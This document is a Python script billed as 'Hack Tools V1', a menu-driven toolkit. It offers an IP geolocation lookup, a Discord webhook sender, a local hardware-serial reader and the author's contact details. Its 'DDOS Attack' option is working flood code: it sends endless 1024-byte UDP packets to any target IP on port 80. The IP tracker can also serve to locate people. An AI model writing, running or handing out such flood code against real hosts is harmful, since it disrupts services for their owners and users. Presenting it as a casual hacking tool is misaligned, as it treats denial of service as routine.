import os
import json
import time
import socket
import requests
import wmi

logo = '''
    \u001b[38;2;50;255;50m ▄████▄   ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ \u001b[0m
    \u001b[38;2;44;229;57m▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ \u001b[0m
    \u001b[38;2;39;203;66m▒▓█    ▄ ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   \u001b[0m
    \u001b[38;2;33;177;73m▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒\u001b[0m
    \u001b[38;2;28;151;81m▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒\u001b[0m
    \u001b[38;2;22;125;89m░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░\u001b[0m
    \u001b[38;2;17;99;96m  ░  ▒     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░\u001b[0m
    \u001b[38;2;11;72;104m░          ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  \u001b[0m
    \u001b[38;2;6;46;112m░ ░         ░        ░  ░   ░        ░ ░        ░  \u001b[0m
    \u001b[38;2;0;20;120m░                         ░                        \u001b[0m
    \033[31m         Hack Tools V1 - by Credos         \033[0m
'''

while True:
    os.system('cls')
    print(logo)
    os.system('title Hack Tools V1 - by Credos')
    print("\033[31mPress 1 for IP Track and press Enter")
    print("\033[31mFor DDOS Attack, press 2 and then press Enter.")
    print("\033[31mFor Discord Webhook press 3 and then press Enter.")
    print("\033[31mFor HWID Serials press 4 and then press Enter.")
    print("\033[31mFor Advertisement press 5 and then press Enter.")

    x = input('Read the Instructions to Get Started.')

#------------------------DDOS ATTACK------------------------
    if x == '2':
        print(logo)
        target_ip = input("\033[31mTarget IP: ")  
        target_port = 80
        veri_boyutu = 1024
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            veri = b'A' * veri_boyutu
            udp_socket.sendto(veri, (target_ip, target_port))
            print(f'{veri_boyutu} byte Sended.')

#------------------------IP TRACKER------------------------
    
    if x == '1':
        os.system('cls')
        print(logo)
        ip = input('\033[31mEnter IP Address: ')

        try:
            from urllib.request import urlopen
            url = f'http://ip-api.com/json/{ip}'
            response = urlopen(url)
            data = json.load(response)

            print('\nFetching data...\n')
            time.sleep(2)

            print(f'country: {data['country']}')
            print(f'region: {data['regionName']}')
            print(f'city: {data['city']}')
            print(f'zip code: {data['zip']}')
            print(f'ISP: {data['isp']}')
            print(f'IP: {data['query']}')


        except Exception as e:
            print(f"An error occured: {e}")

        input('\nPress Enter to Continue...')

#------------------------DİSCORD WEBHOOK------------------------
    if x == '3':
        print(logo)
        os.system("cls")
        print("\033[31mWEBHOOK SENDER")
        url = input("Webhook URL: ")
        message = input("Message: ")
        name = input("Webhook Name: ")

        data = {
            "content": message,
            "username": name
        }

        try:
            r = requests.post(url, json=data)
            print("Webhook Sent!")
        except:
            print("ERROR SENDING WEBHOOK")
        print(
            pause = input("Press enter to return...")
        )
#------------------------HWID SERİAL------------------------
    if x == '4':
        print(logo)
        try:
        
            c = wmi.WMI()
        
            motherboard = c.Win32_BaseBoard()[0].SerialNumber
            cpu = c.Win32_Processor()[0].ProcessorId
            ram = c.Win32_PhysicalMemory()[0].SerialNumber
            volume = [d.VolumeSerialNumber for d in c.Win32_LogicalDisk() if d.DeviceID == 'C:'][0] 
        
            print(f"\033[31mMotherboard Serial: {motherboard}")
            print(f"\033[31mCPU Serial (ProcessorID): {cpu}")
            print(f"\033[31mRAM Serial: {ram}")
            print(f"\033[31mVOLUME ID: {volume}")
        
        except Exception as e:
            print(f"\033[31mHata: Windows'a özgü WMI kütüphanesi gerekli. (Açıklama: {e})")
        input("\033[31mPress Enter to return...")
#------------------------ADVERSİTEMENT------------------------
    if x == '5':
        print(logo)
        print("\033[31mE-Mail:credosproject9@gmail.com")
        print("\033[31mDiscord: credos_.")
        print("\033[31mYouTube: www.youtube.com/@credoshacks")
        input("\033[31mPress Enter to return...")